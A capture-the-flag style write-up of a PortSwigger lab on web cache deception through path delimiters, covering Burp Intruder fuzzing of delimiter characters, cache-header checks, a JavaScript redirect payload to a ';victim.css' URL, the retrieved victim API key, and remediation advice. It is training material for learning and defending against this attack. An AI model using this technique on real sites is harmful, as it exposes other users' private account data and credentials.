# Exploiting Path Delimiters for Web Cache Deception

## Description

To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.

A list of possible delimiter characters was provided to help identify candidates: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).

### Required Knowledge

To solve this lab, you need to know:

- How to identify discrepancies in how the cache and origin server interpret characters as delimiters.
- How delimiter discrepancies can be used to exploit a static directory cache rule.

## Solution

### Step 1: Establish a caching baseline

I logged in using the given credentials `wiener:peter` and checked which paths were being cached.

Visiting `/my-account` directly showed no `X-Cache` or `Cache-Control` headers in the response, which makes sense since this page returns private, user-specific data that should never be cached.

I then tested a few static extensions appended to the account path. `/my-account.css` and `/my-account.jpeg` were both cached, along with `.js` files, but `.png` was not.

### Step 2: Identify path delimiters used by the origin server

1. In Burp's Proxy > HTTP history, I right-clicked the `GET /my-account` request and sent it to Repeater.
2. I added an arbitrary path segment: `/my-account/abc`, and sent it. This returned `404 Not Found` with no evidence of caching, showing the origin server does not treat `/my-account/abc` as equivalent to `/my-account`.
3. I then appended an arbitrary string directly to the path instead: `/my-accountabc`.

   ```http
   GET /my-accountabc HTTP/2
   Host: 0aa700180311dabb8023036600fa0065.web-security-academy.net
   Cookie: session=1SyBQeSwc12E5dYIIlfFPMrG7wySJcFp
   Dnt: 1
   Upgrade-Insecure-Requests: 1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Sec-Fetch-Site: same-origin
   Sec-Fetch-Mode: navigate
   Sec-Fetch-User: ?1
   Sec-Fetch-Dest: document
   Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
   Sec-Ch-Ua-Mobile: ?0
   Sec-Ch-Ua-Platform: "Windows"
   Referer: https://0aa700180311dabb8023036600fa0065.web-security-academy.net/login
   Accept-Encoding: gzip, deflate, br
   Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
   Priority: u=0, i
   Content-Type: text/css; charset=utf-8
   ```

   This returned `404 Not Found` as well, with no evidence of caching. This response served as a baseline to identify characters that are *not* treated as delimiters by the origin server.

4. I sent this request to Intruder, kept the Sniper attack type, and set a payload position right after `/my-account`:

   ```
   /my-account§§abc
   ```

5. As the payload list, I used the following candidate delimiter characters (and their URL-encoded equivalents), deselecting "URL-encode these characters" under payload encoding:

   ```
   ! " # $ % & ' ( ) * + , - . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~
   %21 %22 %23 %24 %25 %26 %27 %28 %29 %2A %2B %2C %2D %2E %2F %3A %3B %3C %3D %3E %3F %40 %5B %5C %5D %5E %5F %60 %7B %7C %7D %7E
   ```

6. After running the attack and sorting by status code, only `;` and `?` returned `200 OK` with the account content (including the API key). Every other character returned `404 Not Found`. This indicated that the origin server treats `;` and `?` as path delimiters, meaning it interprets anything after either character as separate from the actual route, and still serves `/my-account`'s content.

### Step 3: Investigate delimiter discrepancies with the cache

1. Using the `?` delimiter, I requested `/my-account?abc.js`. The response showed no evidence of caching, suggesting the cache also treats `?` as a delimiter, and correctly recognizes that everything after it is not a real static file.
2. I repeated this with the `;` delimiter instead: `/my-account;abc.js`. This response included an `X-Cache: miss` header.
3. Resending the same request changed the header to `X-Cache: hit`.

   This showed a discrepancy: the cache does **not** treat `;` as a delimiter, and instead applies its static-file caching rule based solely on the `.js` extension at the end of the path. The origin server, on the other hand, does treat `;` as a delimiter and still routes the request to the `/my-account` handler, returning the account owner's private data. This mismatch is exploitable, since a URL like `/my-account;anything.js` will be cached by the cache server as a static resource, while the origin server serves it as the dynamic, personalized account page.

### Step 4: Craft and deliver the exploit

Using Burp's exploit server, I crafted a payload that redirects the victim (`carlos`) to a uniquely named cacheable URL, ensuring their own request populates a fresh cache entry with their account data rather than reusing my own cached response:

```html
<script>
document.location="https://0aa700180311dabb8023036600fa0065.web-security-academy.net/my-account;victim.css";
</script>
```

I delivered this exploit to the victim.

### Step 5: Retrieve the cached victim data

After allowing time for the victim to visit the exploit URL, I loaded the same URL in a private browsing window (unauthenticated):

```
https://0aa700180311dabb8023036600fa0065.web-security-academy.net/my-account;victim.css
```

The cached response contained `carlos`'s account details:

```
My Account
Your username is: carlos
Your API Key is: kP2Ww8A2sMd6dPoGjzaPQc1kqq0lcQW7
```

### Step 6: Submit the API key

I submitted the retrieved API key for `carlos`, which solved the lab.

## Root Cause

The origin server and the cache disagree on which characters act as path delimiters. The origin server treats both `;` and `?` as delimiters, meaning it ignores everything after them and still routes the request to the dynamic `/my-account` handler. The cache, however, only recognizes `?` as a delimiter, and treats `;` as a literal part of the filename, applying its static-file caching rule based purely on the trailing `.js` (or similar) extension. This mismatch allows a URL like `/my-account;anything.js` to be cached as if it were a static resource, while it actually still returns a specific user's private, dynamic account data from the origin server.

## Remediation

- Ensure the cache and the origin server use identical logic for parsing and normalizing URL paths, including which characters are treated as delimiters.
- Avoid caching based solely on the presence of a file extension in the URL; instead, base caching decisions on the actual `Content-Type` and cache-control directives returned by the origin server.
- Explicitly mark responses containing personalized or sensitive data as non-cacheable (for example, `Cache-Control: no-store`), regardless of how the request path is formatted.
- Regularly test caching behavior against a range of delimiter characters and encodings to catch discrepancies between the cache and origin server before they can be exploited.